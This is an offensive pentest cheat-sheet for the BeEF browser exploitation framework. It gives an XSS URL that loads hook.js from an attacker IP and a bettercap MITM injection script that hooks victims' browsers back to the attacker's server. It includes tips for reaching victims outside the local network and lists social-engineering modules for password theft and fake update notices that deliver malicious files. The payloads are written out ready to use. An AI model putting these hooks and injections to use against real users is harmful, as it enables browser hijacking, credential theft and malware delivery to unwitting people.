# BeEF (Browser Exploitation Framework)

* Overview
* Hook
  * XSS Reflective
  * MITM Bettercap injection example
* Exploiting
  * Social Engineering Attacks

## Overview

> https://beefproject.com, it comes installed with Kali Linux.

BeEF is a penetration testing tool that focuses on web browser by using client-side attacks vectors.

Targets need to be hooked (once they load a hook url) by:

* XSS exploit.
* DNS spoof requests to a page containing the hook.
* Inject hook in browsed pages (MITM).
* Social engineering the target to open a hook page (i.e, host website with Apache).
* Etc...

## Hook

### XSS Reflective

If you do find a valid XSS on a site, you will need to craft your XSS findings to utilize the BeEF Framework.

```
cd /usr/share/beef-xss
./beef
```

You can log into the console UI at `http://127.0.0.1:3000/ui/authentication`, with credentials `beef:beef`.

`htttp://127.0.0.1:3000/hook.js` is the payload that will control the victim user and will be injected into the victim browser's page. Once injected, their browser will connect back into your central server and the victim will be unaware.

Suppose we find the vulnerable URL of: `http://securepla.net/xss_example/example.php?alert=test;<script>[iframe]</script>`.

We are going to craft a URL that uses JavaScript to include the `hook.js` file. it will look something like: `http://securepla.net/xss_example/example.php?alert=asda<script src="http://192.168.10.91:3000/hook.js></script>">.` Once you trick a victim to go that URL using *Social Engineering Tactics*, they will be part of your XSS zombie network.

### MITM Bettercap injection example

We will use `hstshijack.cap` with a custom payload. Let's name our payload `inject_beef.js`:

```
const imported = document.createElement('script');
imported.src = 'http://<IP>:3000/hook.js`; // replace with your BeEF hook url
document.head.appendChild(imported);
```

> If you want to use this outside your network, you should replace IP with your REAL IP, not LAN IP, and configure IP forwarding so that your router forwards requests coming through your set up port to your machine.

And add to the caplet in `set hstshijack.payloads` value.

Then start bettercap...

```
bettercap -iface <CONNECTED_INTERFACE> -caplet /root/spoof.cap
```

## Exploiting

### Social Engineering Attacks

There's a whole section for _Social Engineering_ with interesting tools such as:

* Extensions for dropping HTTPS
* Pretty Theft (authentication dialogs for requesting passwords)
* Fake Update Notification Bar (send hosted malicious file)
